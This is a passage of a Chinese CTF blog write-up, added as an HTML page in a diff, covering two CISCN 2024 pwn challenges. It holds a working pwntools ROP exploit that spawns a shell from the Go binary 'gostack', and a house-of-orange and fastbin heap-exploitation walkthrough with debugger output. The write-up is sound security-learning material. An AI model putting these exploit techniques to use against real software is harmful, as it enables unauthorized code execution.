@@ -1,0 +1,1260 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="voidchunk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ciscn2024-初赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2024 初赛 wp">
+<meta property="og:url" content="https://voidchunk.github.io/2024/05/20/ciscn2024-%E5%88%9D%E8%B5%9B-wp/index.html">
+<meta property="og:site_name" content="voidchunk&#39;s blog">
+<meta property="og:description" content="ciscn2024-初赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida7.5.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida8.3.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic-l.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_trim.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_hook_and_main_arena.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCMessageDescriptor.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-structure-insert.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-data-struct.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCFieldDescriptor-field1.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-main.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-menu.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-sub_1C87.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-1.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-2.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-hexdump.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-2.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-3.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-alloc.png">
+<meta property="article:published_time" content="2024-05-20T11:45:19.000Z">
+<meta property="article:modified_time" content="2025-03-15T15:21:02.344Z">
+<meta property="article:author" content="voidchunk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://voidchunk.github.io/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida7.5.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ciscn2024 初赛 wp - voidchunk&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"voidchunk.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>voidchunk</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://github.com/voidchunk" target="_self">
+                <i class="iconfont icon-github-fill"></i>
+                <span>GitHub</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ciscn2024 初赛 wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-20 19:45" pubdate>
+          2024年5月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ciscn2024 初赛 wp</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年3月15日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>ciscn2024-初赛</p>
+<span id="more"></span>
+
+<blockquote>
+<p>pwn和web题目赛后环境 <a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
+</blockquote>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>go语言的栈溢出题，开始用的ida7.5，啥也逆不出来，后面换成ida8.3，都不用怎么逆就出来了<br>这里放一下ida7.5和ida8.3打开后的截图</p>
+<p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida7.5.png" srcset="/img/loading.gif" lazyload alt="ida7.5"><br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-ida8.3.png" srcset="/img/loading.gif" lazyload alt="ida8.3"><br>上面第一张是ida7.5的，第二张是ida8.3的</p>
+<p>大致看一下代码，运行一下，用cyclic测量溢出点<br>go语言运行报错后会直接打印错误的返回地址，就不用gdb调试了<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic.png" srcset="/img/loading.gif" lazyload></p>
+<p>得出溢出点464<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/gostack-cyclic-l.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实main_main_func2就是后门函数，不过懒得看代码了，直接用系统调用获取shell</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./gostack&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># ROPgadget</span><br>rdi = <span class="hljs-number">0x4a18a5</span> <span class="hljs-comment">#0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret</span><br>rsi = <span class="hljs-number">0x42138a</span> <span class="hljs-comment">#0x000000000042138a : pop rsi ; ret</span><br>rax = <span class="hljs-number">0x40f984</span> <span class="hljs-comment">#0x000000000040f984 : pop rax ; ret</span><br>rdx = <span class="hljs-number">0x4944ec</span> <span class="hljs-comment">#0x00000000004944ec : pop rdx ; ret</span><br>ret = <span class="hljs-number">0x40201a</span> <span class="hljs-comment">#0x000000000040201a : ret</span><br>syscall = <span class="hljs-number">0x4616C9</span> <span class="hljs-comment">#0x00000000004616C9 : syscall ; ret</span><br><br>addr = <span class="hljs-number">0x5978d8</span> <span class="hljs-comment"># 随便找一个能写的地址，不行就换一个</span><br><br><span class="hljs-comment"># function</span><br>main = <span class="hljs-number">0x04A0AC0</span><br><br><span class="hljs-comment"># send</span><br><span class="hljs-comment">#gdb.attach(p))</span><br><br><span class="hljs-comment"># 在addr处写字符串</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">464</span> + p64(rax) + p64(<span class="hljs-number">0x0</span>) + p64(rdi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(rsi) + p64(addr) + p64(rdx) + p64(<span class="hljs-number">0x30</span>) + p64(syscall)<br><span class="hljs-comment"># 将addr处的字符串作为参数执行sys-execv</span><br>payload+= p64(rax) + p64(<span class="hljs-number">0x3b</span>) + p64(rdi) + p64(addr) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(rsi) + p64(<span class="hljs-number">0</span>) + p64(rdx) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your magic message :&#x27;</span>,payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Your magic message :&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>house of orange + fastbin attack</p>
+<p>一道堆菜单题，但是限制了show和delete的次数<br>每次add操作后申请的堆内存无编号，都是针对ptr的操作<br>edit函数内可以多写8个字节，可以改写下一个chunk的size</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+<li>通过edit溢出修改top_chunk的size，然后通过申请较大的chunk调用sysmalloc函数中的_int_free将原top chunk置入unsorted bin(这是house of orange的攻击手法)</li>
+<li>通过show泄露unsorted bin的bk指针，这个指针会指向main_arena结构体内部的一个成员，通过main_arena与libc的偏移泄露libc基址</li>
+<li>通过伪造chunk进行fastbin attack将堆分配到malloc_hook位置，写上one_gadget</li>
+<li>再次调用malloc即可获取shell</li>
+</ol>
+<h4 id="修改top-chunk的size"><a href="#修改top-chunk的size" class="headerlink" title="修改top chunk的size"></a>修改top chunk的size</h4><p>关于修改top chunk的size，需要修改后的top chunk的满足以下几个条件</p>
+<ol>
+<li>伪造的 size 必须要对齐到内存页</li>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ol>
+<p>对齐到内存页，即size(no_flag_bit)大小需要为2* SIZE_SZ的整数倍<br>所以我们修改top chunk的size为0xf91(0b1111 1001 0001)<br>0xf91最后一位为PRE_INUSE，去掉flag_bit最后4位为零（即满足对齐到内存页），并且大于0x10且小于我们要申请的0x1000</p>
+<p>所以可以修改为0xf91</p>
+<h4 id="计算main-arena与libc基址的偏移"><a href="#计算main-arena与libc基址的偏移" class="headerlink" title="计算main_arena与libc基址的偏移"></a>计算main_arena与libc基址的偏移</h4><p>关于如何计算main_arena与libc的偏移，main_arena是一个全局变量，这里有两种思路可以得知main_arena在libc中的偏移</p>
+<ol>
+<li>利用malloc_trim函数，这个函数会访问main_arena，可以通过这个函数在ida中找到偏移</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>__malloc_trim (<span class="hljs-type">size_t</span> s)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_trim.png" srcset="/img/loading.gif" lazyload><br>可知本题所用libc与main_arena的偏移为 0x3C4B20</p>
+<ol start="2">
+<li>利用malloc_hook算出<br>main_arena与malloc_hook的地址差为0x10，而malloc_hook的值可以用pwntools直接查到</li>
+</ol>
+<p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/malloc_hook_and_main_arena.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure>
+
+<p>利用这两种方法之一，便可以算出main_arena在libc中的偏移了，得出偏移为0x3C4B20<br>再获取bk和main_arena的偏移，即可计算libc_base</p>
+<h4 id="计算bk与main-arena的偏移"><a href="#计算bk与main-arena的偏移" class="headerlink" title="计算bk与main_arena的偏移"></a>计算bk与main_arena的偏移</h4><p>可以直接调试获取</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; heap<br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1000<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x71<br><br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1070<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x21<br><br><span class="hljs-attribute">Free</span> chunk (unsortedbin) | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1090<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>xf51<br><span class="hljs-attribute">fd</span>: <span class="hljs-number">0</span>x7e344694bb78<br><span class="hljs-attribute">bk</span>: <span class="hljs-number">0</span>x7e344694bb78<br><br><span class="hljs-attribute">Allocated</span> chunk<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1fe0<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x10<br><br><span class="hljs-attribute">Allocated</span> chunk | PREV_INUSE<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b1ff0<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x11<br><br><span class="hljs-attribute">Allocated</span> chunk<br><span class="hljs-attribute">Addr</span>: <span class="hljs-number">0</span>x6549ce9b2000<br><span class="hljs-attribute">Size</span>: <span class="hljs-number">0</span>x00<br><br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x6549ce9b1070<br><span class="hljs-attribute">0x6549ce9b1070</span>: <span class="hljs-number">0</span>x6161616161616161      <span class="hljs-number">0</span>x0000000000000021<br><span class="hljs-attribute">0x6549ce9b1080</span>: <span class="hljs-number">0</span>x6262626262626262      <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x6549ce9b1090</span>: <span class="hljs-number">0</span>x00006549ce9b1070      <span class="hljs-number">0</span>x0000000000000f51<br><span class="hljs-attribute">0x6549ce9b10a0</span>: <span class="hljs-number">0</span>x00007e344694bb78      <span class="hljs-number">0</span>x00007e344694bb78<br><span class="hljs-attribute">0x6549ce9b10b0</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x7e344694c188</span> &lt;main_arena+<span class="hljs-number">1640</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c178      <span class="hljs-number">0</span>x00007e344694c178<br><span class="hljs-attribute">0x7e344694c198</span> &lt;main_arena+<span class="hljs-number">1656</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c188      <span class="hljs-number">0</span>x00007e344694c188<br><span class="hljs-attribute">0x7e344694c1a8</span> &lt;main_arena+<span class="hljs-number">1672</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c198      <span class="hljs-number">0</span>x00007e344694c198<br><span class="hljs-attribute">0x7e344694c1b8</span> &lt;main_arena+<span class="hljs-number">1688</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c1a8      <span class="hljs-number">0</span>x00007e344694c1a8<br><span class="hljs-attribute">0x7e344694c1c8</span> &lt;main_arena+<span class="hljs-number">1704</span>&gt;:       <span class="hljs-number">0</span>x00007e344694c1b8      <span class="hljs-number">0</span>x00007e344694c1b8<br><span class="hljs-attribute">pwndbg</span>&gt;<br></code></pre></td></tr></table></figure>
+<p>可知偏移为main_arena+1640</p>
+<p>但也可以通过计算获取，首先我们来看一下main_arena的结构体malloc_state<br>题目的libc是2.23，没有have_fastchunks这个成员，2.27之后新加了该成员，计算时注意一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define(, mutex);<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<span class="hljs-comment">//glibc-2.27新加的一个成员</span><br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins , help to speed up the process of determinating if a given bin is definitely empty */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span>* <span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span>* <span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
